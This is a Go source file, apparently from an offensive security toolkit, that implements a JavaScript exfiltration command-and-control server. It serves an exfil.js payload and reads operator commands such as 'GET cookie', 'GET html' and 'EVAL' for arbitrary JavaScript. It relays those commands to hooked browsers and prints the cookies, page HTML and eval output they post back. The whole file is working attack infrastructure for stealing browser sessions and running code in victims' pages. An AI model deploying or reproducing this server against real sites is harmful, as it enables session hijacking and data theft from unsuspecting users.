package gopserver

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/http/httputil"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gobuffalo/packr/v2"
	"github.com/gorilla/mux"
	gopproxy "github.com/hophouse/gop/gopProxy"
	"github.com/hophouse/gop/utils"
	"github.com/hophouse/gop/utils/logger"
	"github.com/urfave/negroni"
)

type JavascriptExfilStruct struct {
	Host     string
	Port     string
	Scheme   string
	Vhost    string
	ExfilUrl string
	Box      *packr.Box
	InputMu  *sync.Mutex
}

func (js *JavascriptExfilStruct) RunJavascriptExfilHTTPServerCmd() {
	server, err := js.GetServerCmd()
	if err != nil {
		return
	}

	addr := fmt.Sprintf("%s:%s", js.Host, js.Port)
	logger.Printf("[+] Starting JSExfil server listening to : http://%s\n", addr)

	logger.Fatal(server.ListenAndServe())
}

func (js *JavascriptExfilStruct) RunJavascriptExfilHTTPSServerCmd() {
	server, err := js.GetServerCmd()
	if err != nil {
		return
	}

	caManager, err := gopproxy.InitCertManager("", "")
	if err != nil {
		logger.Fatalf(err.Error())
	}

	cert, err := caManager.CreateCertificate(js.GetCertSubject())
	if err != nil {
		logger.Fatalf(err.Error())
	}

	server.TLSConfig = &tls.Config{
		Certificates:       []tls.Certificate{cert},
		InsecureSkipVerify: true,
	}

	addr := fmt.Sprintf("%s:%s", js.Host, js.Port)
	logger.Printf("[+] Starting JSExfil server listening to : https://%s\n", addr)
	logger.Fatal(server.ListenAndServeTLS("", ""))
}

func (js *JavascriptExfilStruct) GetServerCmd() (http.Server, error) {

	addr := fmt.Sprintf("%s:%s", js.Host, js.Port)

	r := js.CreateJSExfilRouter()

	n := negroni.New(negroni.NewRecovery())
	n.Use(&JSExfilLogMiddleware{
		js: js,
	})
	n.UseHandler(r)

	server := http.Server{
		Addr:    addr,
		Handler: n,
	}

	return server, nil
}

func (js *JavascriptExfilStruct) CreateJSExfilRouter() *mux.Router {
	// Router
	r := mux.NewRouter()

	r.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		js.IndexHandler(w, r)
	}).Methods("GET")

	r.HandleFunc("/index.html", func(w http.ResponseWriter, r *http.Request) {
		js.IndexHandler(w, r)
	}).Methods("GET")

	r.HandleFunc("/exfil.js", func(w http.ResponseWriter, r *http.Request) {
		js.JSExfilHandler(w, r)
	}).Methods("GET")

	r.HandleFunc("/exfil-input", func(w http.ResponseWriter, r *http.Request) {
		js.JSExfilInputHandler(w, r)
	}).Methods("GET")

	r.HandleFunc("/exfil-output", func(w http.ResponseWriter, r *http.Request) {
		js.JSExfilOutputHandler(w, r)
	}).Methods("POST")

	// Will respond to all requests that do not match previous selectors
	// r.PathPrefix("/").HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
	// 	js.IndexHandler(w, r)
	// }).Methods("GET")

	return r
}

func (js *JavascriptExfilStruct) IndexHandler(w http.ResponseWriter, r *http.Request) {
	htmlCode, err := js.Box.FindString("index.html")
	if err != nil {
		logger.Fatal(err)
	}

	fmt.Fprintf(w, "%s\n", htmlCode)
}

func (js *JavascriptExfilStruct) JSExfilHandler(w http.ResponseWriter, r *http.Request) {
	jsCode, err := js.Box.FindString("exfil.js")
	if err != nil {
		logger.Fatal(err)
	}

	jsCode = strings.ReplaceAll(jsCode, "{{EXFIL-URL}}", js.GetExfilUrl())

	fmt.Fprintf(w, "%s\n", jsCode)
}

func (js *JavascriptExfilStruct) JSExfilInputHandler(w http.ResponseWriter, r *http.Request) {
	var input string
	for {
		input = ""
		reader := bufio.NewReader(os.Stdin)
		for {
			var err error

			fmt.Printf("\n[+] Enter cmd : ")
			input, err = reader.ReadString('\n')
			if err != nil {
				continue
			}
			// convert CRLF to LF
			input = strings.Replace(input, "\r", "", -1)
			input = strings.Replace(input, "\n", "", -1)

			if len(input) < 4 {
				continue
			}

			break
		}

		if strings.ToUpper(input[:4]) == "EXIT" {
			input = "EXIT"
			break
		}

		if len(input) > 4 && strings.ToUpper(input[:4]) == "GET " {
			if strings.ToLower(input[4:]) == "cookie" {
				input = "EVAL document.cookie"
			} else if strings.ToLower(input[4:]) == "html" {
				input = "EVAL document.getElementsByTagName(\"html\")[0].outerHTML"
			} else {
				input = "GET " + input[4:]
			}
			break
		}
		if len(input) > 5 && strings.ToUpper(input[:5]) == "EVAL " {
			input = "EVAL " + input[5:]
			break
		}

		fmt.Printf("Unknown command\n")
		fmt.Printf("[?] Help\n")
		fmt.Printf("\tGET html - Retrieve the html source code of the page\n")
		fmt.Printf("\tGET cookie - Retrieve the \"document.cookie\" value\n")
		fmt.Printf("\tGET URI - Request the specific URI and retrieve response content\n")
		fmt.Printf("\tGET URL - Request the specific URL and retrieve response content\n")
		fmt.Printf("\tEVAL cmd - Use the eval() function to evaluate content of cmd and retrieve output\n")
	}

	logger.Fprintf(logger.Writer(), "[+] Command : %s", input)
	fmt.Fprintf(w, "%s", input)
}

func (js *JavascriptExfilStruct) JSExfilOutputHandler(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		logger.Println(err)
		return
	}
	r.Body.Close()

	fmt.Printf("%s", body)

	w.Write([]byte("HTTP1/1 200 OK\n\n"))
}

func (js *JavascriptExfilStruct) GetExfilUrl() string {
	if js.ExfilUrl != "" {
		return js.ExfilUrl
	}

	return fmt.Sprintf("%s://%s:%s", js.Scheme, js.GetCertSubject(), js.Port)
}

func (js *JavascriptExfilStruct) GetCertSubject() string {
	if js.Vhost != "" {
		return js.Vhost
	} else {
		return js.Host
	}
}

type JSExfilLogMiddleware struct {
	js *JavascriptExfilStruct
}

func (l JSExfilLogMiddleware) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
	reqDump, err := httputil.DumpRequest(r, true)
	if err != nil {
		logger.Fatal(err)
	}

	logger.Fprintf(logger.Writer(), "\n[%s] [%s] %s %s\n", time.Now().Format("2006.01.02 15:04:05"), utils.GetSourceIP(r), r.Method, r.URL.String())
	logger.Fprintf(logger.Writer(), "%s\n", string(reqDump))

	next(w, r)
}
